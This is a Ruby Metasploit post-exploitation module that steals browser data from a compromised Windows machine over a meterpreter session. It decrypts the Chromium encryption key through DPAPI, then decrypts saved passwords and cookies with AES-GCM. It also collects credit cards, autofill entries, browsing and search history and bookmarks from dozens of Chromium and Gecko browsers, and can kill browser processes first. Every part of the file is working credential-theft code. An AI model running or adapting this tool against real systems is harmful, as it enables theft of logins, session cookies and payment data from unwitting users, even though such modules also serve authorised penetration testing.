require 'sqlite3'

IV_SIZE = 12
TAG_SIZE = 16

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Advanced Browser Data Extraction for Chromium and Gecko Browsers',
        'Description' => %q{
          This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers
          on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI)
          and can extract additional data such as browsing history, keyword search history, download history, autofill data,
          and credit card information.
        },
        'License' => MSF_LICENSE,
        'Platform' => ['win'],
        'Arch' => [ ARCH_X64, ARCH_X86 ],
        'Targets' => [['Windows', {}]],
        'SessionTypes' => ['meterpreter'],
        'Author' => ['Alexander "xaitax" Hagenah'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options([
      OptBool.new('KILL_BROWSER', [false, 'Kill browser processes before extracting data', false]),
    ])
  end

  def run
    if session.type != 'meterpreter'
      print_error('This module requires a meterpreter session.')
      return
    end

    user_profile = get_env('USERPROFILE')
    user_account = session.sys.config.getuid
    ip_address = session.sock.peerhost

    if user_profile.nil? || user_profile.empty?
      print_error('Could not determine the current user profile directory.')
      return
    end

    print_status("Targeting: #{user_account} (#{ip_address}).")
    print_status("Starting data extraction from user profile: #{user_profile}")

    process_chromium_browsers(user_profile)
    process_gecko_browsers(user_profile)
  end

  # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
  def process_chromium_browsers(base_path)
    chromium_browsers = {
      'Microsoft\\Edge\\' => 'Microsoft Edge',
      'Google\\Chrome\\' => 'Google Chrome',
      'Opera Software\\Opera Stable' => 'Opera',
      'Iridium\\' => 'Iridium',
      'Chromium\\' => 'Chromium',
      'BraveSoftware\\Brave-Browser\\' => 'Brave',
      'CentBrowser\\' => 'CentBrowser',
      'Chedot\\' => 'Chedot',
      'Orbitum\\' => 'Orbitum',
      'Comodo\\Dragon\\' => 'Comodo Dragon',
      'Yandex\\YandexBrowser\\' => 'Yandex Browser',
      '7Star\\7Star\\' => '7Star',
      'Torch\\' => 'Torch',
      'MapleStudio\\ChromePlus\\' => 'ChromePlus',
      'Kometo\\' => 'Komet',
      'Amigo\\' => 'Amigo',
      'Sputnik\\Sputnik\\' => 'Sputnik',
      'CatalinaGroup\\Citrio\\' => 'Citrio',
      '360Chrome\\Chrome\\' => '360Chrome',
      'uCozMedia\\Uran\\' => 'Uran',
      'liebao\\' => 'Liebao',
      'Elements Browser\\' => 'Elements Browser',
      'Epic Privacy Browser\\' => 'Epic Privacy Browser',
      'CocCoc\\Browser\\' => 'CocCoc Browser',
      'Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer' => 'Sleipnir',
      'QIP Surf\\' => 'QIP Surf',
      'Coowon\\Coowon\\' => 'Coowon',
      'Vivaldi\\' => 'Vivaldi'
    }

    chromium_browsers.each do |path, name|
      profile_path = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Default"
      next unless directory?(profile_path)

      print_status("Found #{name}")
      kill_browser_process(name) if datastore['KILL_BROWSER']

      local_state = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Local State"
      encryption_key = get_encryption_key(local_state)
      extract_chromium_data(profile_path, encryption_key, name)
    end
  end

  # Browsers and paths taken from https://github.com/shaddy43/BrowserSnatch/
  def process_gecko_browsers(base_path)
    gecko_browsers = {
      'Mozilla\\Firefox\\' => 'Mozilla Firefox',
      'Thunderbird\\' => 'Thunderbird',
      'Mozilla\\SeaMonkey\\' => 'SeaMonkey',
      'NETGATE Technologies\\BlackHawk\\' => 'BlackHawk',
      '8pecxstudios\\Cyberfox\\' => 'Cyberfox',
      'K-Meleon\\' => 'K-Meleon',
      'Mozilla\\icecat\\' => 'Icecat',
      'Moonchild Productions\\Pale Moon\\' => 'Pale Moon',
      'Comodo\\IceDragon\\' => 'Comodo IceDragon',
      'Waterfox\\' => 'Waterfox',
      'Postbox\\' => 'Postbox',
      'Flock\\Browser\\' => 'Flock Browser'
    }

    gecko_browsers.each do |path, name|
      profile_path = "#{base_path}\\AppData\\Roaming\\#{path}\\Profiles"
      next unless directory?(profile_path)

      print_status("Found #{name}")
      kill_browser_process(name) if datastore['KILL_BROWSER']

      session.fs.dir.entries(profile_path).each do |profile|
        next if profile == '.' || profile == '..'

        extract_gecko_data("#{profile_path}\\#{profile}", name)
      end
    end
  end

  def kill_browser_process(browser)
    browser_process_names = {
      'Microsoft Edge' => 'msedge.exe',
      'Google Chrome' => 'chrome.exe',
      'Opera' => 'opera.exe',
      'Iridium' => 'iridium.exe',
      'Chromium' => 'chromium.exe',
      'Brave' => 'brave.exe',
      'CentBrowser' => 'centbrowser.exe',
      'Chedot' => 'chedot.exe',
      'Orbitum' => 'orbitum.exe',
      'Comodo Dragon' => 'dragon.exe',
      'Yandex Browser' => 'browser.exe',
      '7Star' => '7star.exe',
      'Torch' => 'torch.exe',
      'ChromePlus' => 'chromeplus.exe',
      'Komet' => 'komet.exe',
      'Amigo' => 'amigo.exe',
      'Sputnik' => 'sputnik.exe',
      'Citrio' => 'citrio.exe',
      '360Chrome' => '360chrome.exe',
      'Uran' => 'uran.exe',
      'Liebao' => 'liebao.exe',
      'Elements Browser' =>
      'elementsbrowser.exe',
      'Epic Privacy Browser' => 'epic.exe',
      'CocCoc Browser' => 'browser.exe',
      'Sleipnir' => 'sleipnir.exe',
      'QIP Surf' => 'qipsurf.exe',
      'Coowon' => 'coowon.exe',
      'Vivaldi' => 'vivaldi.exe'
    }

    process_name = browser_process_names[browser]
    return unless process_name

    session.sys.process.get_processes.each do |process|
      next unless process['name'].downcase == process_name.downcase

      begin
        session.sys.process.kill(process['pid'])
      rescue Rex::Post::Meterpreter::RequestError
        next
      end
    end

    sleep(5)
  end

  def decrypt_data(encrypted_data)
    print_status('Starting DPAPI decryption process.') if datastore['VERBOSE']
    begin
      mem = session.railgun.kernel32.LocalAlloc(0, encrypted_data.length)['return']
      raise 'Memory allocation failed.' if mem == 0

      session.railgun.memwrite(mem, encrypted_data)

      if session.arch == ARCH_X86
        inout_fmt = 'V2'
      elsif session.arch == ARCH_X64
        inout_fmt = 'Q2'
      else
        fail_with(Failure::NoTarget, "Unsupported architecture: #{session.arch}")
      end

      pdatain = [encrypted_data.length, mem].pack(inout_fmt)
      ret = session.railgun.crypt32.CryptUnprotectData(
        pdatain, nil, nil, nil, nil, 0, 2048
      )
      len, addr = ret['pDataOut'].unpack(inout_fmt)
      decrypted_data = len == 0 ? nil : session.railgun.memread(addr, len)

      session.railgun.kernel32.LocalFree(mem)
      session.railgun.kernel32.LocalFree(addr) if addr != 0
      print_good('Decryption successful.') if datastore['VERBOSE']
      return decrypted_data.strip
    rescue StandardError => e
      print_error("Error during DPAPI decryption: #{e.message}")
      return nil
    end
  end

  def get_encryption_key(local_state_path)
    print_status("Getting encryption key from: #{local_state_path}") if datastore['VERBOSE']
    if file?(local_state_path)
      local_state = read_file(local_state_path)
      json_state = begin
        JSON.parse(local_state)
      rescue StandardError
        nil
      end
      if json_state.nil?
        print_error('Failed to parse JSON from Local State file.')
        return nil
      end

      if json_state['os_crypt'] && json_state['os_crypt']['encrypted_key']
        encrypted_key = json_state['os_crypt']['encrypted_key']
        encrypted_key_bin = begin
          Base64.decode64(encrypted_key)[5..]
        rescue StandardError
          nil
        end
        if encrypted_key_bin.nil?
          print_error('Failed to Base64 decode the encrypted key.')
          return nil
        end

        print_status("Encrypted key (Base64-decoded, hex): #{encrypted_key_bin.unpack('H*').first}") if datastore['VERBOSE']
        decrypted_key = decrypt_data(encrypted_key_bin)

        if decrypted_key.nil? || decrypted_key.length != 32
          print_error("Decrypted key is not 32 bytes: #{decrypted_key.nil? ? 'nil' : decrypted_key.length} bytes") if datastore['VERBOSE']
          if decrypted_key.length == 31
            print_status('Decrypted key is 31 bytes, attempting to pad key for decryption.') if datastore['VERBOSE']
            decrypted_key += "\x00"
          else
            return nil
          end
        end
        print_good("Decrypted key (hex): #{decrypted_key.unpack('H*').first}") if datastore['VERBOSE']
        return decrypted_key
      else
        print_error('os_crypt or encrypted_key not found in Local State.')
        return nil
      end
    else
      print_error("Local State file not found at: #{local_state_path}")
      return nil
    end
  end

  def decrypt_chromium_password(encrypted_password, key)
    # Check for the "v20" prefix that indicates App-Bound encryption, which can't be decrypted yet.
    # https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
    if encrypted_password[0, 3] == 'v20'
      print_status('App-Bound encryption detected (v20). Skipping decryption for this entry.') if datastore['VERBOSE']
      return nil
    end

    return print_error('Invalid encrypted password length.') if encrypted_password.nil? || encrypted_password.length < (IV_SIZE + TAG_SIZE)

    iv = encrypted_password[3, IV_SIZE]
    ciphertext = encrypted_password[IV_SIZE + 3...-TAG_SIZE]
    tag = encrypted_password[-TAG_SIZE..]

    if iv.nil? || iv.length != IV_SIZE
      print_error("Invalid IV: expected #{IV_SIZE} bytes, got #{iv.nil? ? 'nil' : iv.length} bytes")
      return nil
    end

    begin
      aes = OpenSSL::Cipher.new('aes-256-gcm')
      aes.decrypt
      aes.key = key
      aes.iv = iv
      aes.auth_tag = tag
      decrypted_password = aes.update(ciphertext) + aes.final
      return decrypted_password
    rescue OpenSSL::Cipher::CipherError
      print_status('Password decryption failed for this entry.') if datastore['VERBOSE']
      return nil
    end
  end

  def extract_chromium_data(profile_path, encryption_key, browser)
    return print_error("Profile path #{profile_path} not found.") unless directory?(profile_path)

    login_data_path = "#{profile_path}\\Login Data"
    if file?(login_data_path)
      extract_sql_data(login_data_path, 'SELECT origin_url, username_value, password_value FROM logins', 'Passwords', browser, encryption_key)
    elsif datastore['VERBOSE']
      print_error("Passwords not found at #{login_data_path}")
    end

    cookies_path = "#{profile_path}\\Network\\Cookies"
    if file?(cookies_path)
      begin
        extract_sql_data(cookies_path, 'SELECT host_key, name, path, encrypted_value FROM cookies', 'Cookies', browser, encryption_key)
      rescue StandardError => e
        if e.message.include?('core_channel_open')
          print_error('└ Cannot access Cookies. File in use by another process.')
        else
          print_error("An error occurred while extracting cookies: #{e.message}")
        end
      end
    elsif datastore['VERBOSE']
      print_error("Cookies not found at #{cookies_path}")
    end

    credit_card_data_path = "#{profile_path}\\Web Data"
    if file?(credit_card_data_path)
      extract_sql_data(credit_card_data_path, 'SELECT * FROM credit_cards', 'Credit Cards', browser, encryption_key)
    elsif datastore['VERBOSE']
      print_error("Credit Cards not found at #{credit_card_data_path}")
    end

    download_history_path = "#{profile_path}\\History"
    if file?(download_history_path)
      extract_sql_data(download_history_path, 'SELECT * FROM downloads', 'Download History', browser)
    elsif datastore['VERBOSE']
      print_error("Download History not found at #{download_history_path}")
    end

    autofill_data_path = "#{profile_path}\\Web Data"
    if file?(autofill_data_path)
      extract_sql_data(autofill_data_path, 'SELECT * FROM autofill', 'Autofill Data', browser)
    elsif datastore['VERBOSE']
      print_error("Autofill data not found at #{autofill_data_path}")
    end

    keyword_search_history_path = "#{profile_path}\\History"
    if file?(keyword_search_history_path)
      extract_sql_data(keyword_search_history_path, 'SELECT term FROM keyword_search_terms', 'Keyword Search History', browser)
    elsif datastore['VERBOSE']
      print_error("Keyword Search History not found at #{keyword_search_history_path}")
    end

    browsing_history_path = "#{profile_path}\\History"
    if file?(browsing_history_path)
      extract_sql_data(browsing_history_path, 'SELECT url, title, visit_count, last_visit_time FROM urls', 'Browsing History', browser)
    elsif datastore['VERBOSE']
      print_error("Browsing History not found at #{browsing_history_path}")
    end

    bookmarks_path = "#{profile_path}\\Bookmarks"
    extract_json_bookmarks(bookmarks_path, 'Bookmarks', browser) if file?(bookmarks_path)
  end

  def extract_gecko_data(profile_path, browser)
    logins_path = "#{profile_path}\\logins.json"
    if file?(logins_path)
      extract_json_data(logins_path, 'Passwords', browser)
    elsif datastore['VERBOSE']
      print_error("Passwords not found at #{logins_path}")
    end

    cookies_path = "#{profile_path}\\cookies.sqlite"
    if file?(cookies_path)
      extract_sql_data(cookies_path, 'SELECT host, name, path, value, expiry FROM moz_cookies', 'Cookies', browser)
    elsif datastore['VERBOSE']
      print_error("Cookies not found at #{cookies_path}")
    end

    download_history_path = "#{profile_path}\\places.sqlite"
    if file?(download_history_path)
      extract_sql_data(download_history_path, 'SELECT place_id, GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id', 'Download History', browser)
    elsif datastore['VERBOSE']
      print_error("Download History not found at #{download_history_path}")
    end

    keyword_search_history_path = "#{profile_path}\\formhistory.sqlite"
    if file?(keyword_search_history_path)
      extract_sql_data(keyword_search_history_path, 'SELECT value FROM moz_formhistory', 'Keyword Search History', browser)
    elsif datastore['VERBOSE']
      print_error("Keyword Search History not found at #{keyword_search_history_path}")
    end

    browsing_history_path = "#{profile_path}\\places.sqlite"
    if file?(browsing_history_path)
      extract_sql_data(browsing_history_path, 'SELECT url, title, visit_count, last_visit_date FROM moz_places', 'Browsing History', browser)
    elsif datastore['VERBOSE']
      print_error("Browsing History not found at #{browsing_history_path}")
    end

    bookmarks_path = "#{profile_path}\\places.sqlite"
    if file?(bookmarks_path)
      extract_sql_data(bookmarks_path, 'SELECT moz_bookmarks.title AS title, moz_places.url AS url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id', 'Bookmarks', browser)
    elsif datastore['VERBOSE']
      print_error("Bookmarks not found at #{bookmarks_path}")
    end
  end

  def extract_json_bookmarks(bookmarks_path, data_type, browser)
    if file?(bookmarks_path)
      bookmarks_data = read_file(bookmarks_path)
      bookmarks_json = JSON.parse(bookmarks_data)

      bookmarks = []
      if bookmarks_json['roots']['bookmark_bar']
        traverse_bookmarks(bookmarks_json['roots']['bookmark_bar'], bookmarks)
      end
      if bookmarks_json['roots']['other']
        traverse_bookmarks(bookmarks_json['roots']['other'], bookmarks)
      end

      browser_clean = browser.gsub('\\', '_').chomp('_')
      timestamp = Time.now.strftime('%Y%m%d%H%M')
      ip = session.sock.peerhost

      if bookmarks.any?
        bookmark_entries = bookmarks.map { |bookmark| "#{bookmark[:name]}: #{bookmark[:url]}" }.join("\n")
        file_name = store_loot("#{browser_clean}_#{data_type}", 'text/plain', session, bookmark_entries, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.txt", "#{browser_clean} #{data_type.capitalize}")
        file_size = ::File.size(file_name)
        print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
      end
    end
  end

  def traverse_bookmarks(bookmark_node, bookmarks)
    if bookmark_node['children']
      bookmark_node['children'].each do |child|
        if child['type'] == 'url'
          bookmarks << { name: child['name'], url: child['url'] }
        elsif child['type'] == 'folder' && child['children']
          traverse_bookmarks(child, bookmarks)
        end
      end
    end
  end

  def extract_sql_data(db_path, query, data_type, browser, encryption_key = nil)
    if file?(db_path)
      db_local_path = "#{Rex::Text.rand_text_alpha(8)}.db"
      session.fs.file.download_file(db_local_path, db_path)

      begin
        db = SQLite3::Database.open(db_local_path)
        result = db.execute(query)

        if encryption_key
          result.each do |row|
            next unless row[-1]

            if data_type == 'Cookies' && row[-1].length >= (IV_SIZE + TAG_SIZE + 3)
              row[-1] = decrypt_chromium_password(row[-1], encryption_key)
            elsif data_type == 'Passwords' && row[2].length >= (IV_SIZE + TAG_SIZE + 3)
              row[2] = decrypt_chromium_password(row[2], encryption_key)
            end
          end
        end

        browser_clean = browser.gsub('\\', '_').chomp('_')
        timestamp = Time.now.strftime('%Y%m%d%H%M')
        ip = session.sock.peerhost
        file_name = store_loot("#{browser_clean}_#{data_type}", 'text/plain', session, result, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.txt", "#{browser_clean} #{data_type.capitalize}")
        file_size = ::File.size(file_name)

        if file_size > 2
          print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
        end
      ensure
        db.close
        ::File.delete(db_local_path) if ::File.exist?(db_local_path)
      end
    end
  end

  def extract_json_data(json_path, data_type, browser)
    return unless file?(json_path)

    json_data = read_file(json_path)
    browser_clean = browser.gsub('\\', '_').chomp('_')
    timestamp = Time.now.strftime('%Y%m%d%H%M')
    ip = session.sock.peerhost
    file_name = store_loot("#{browser_clean}_#{data_type}", 'application/json', session, json_data, "#{timestamp}_#{ip}_#{browser_clean}_#{data_type}.json", "#{browser_clean} #{data_type.capitalize}")
    file_size = ::File.size(file_name)

    if file_size > 2
      print_good("└ Extracted #{data_type.capitalize} to #{file_name} (#{file_size} bytes)")
    end
  end

end
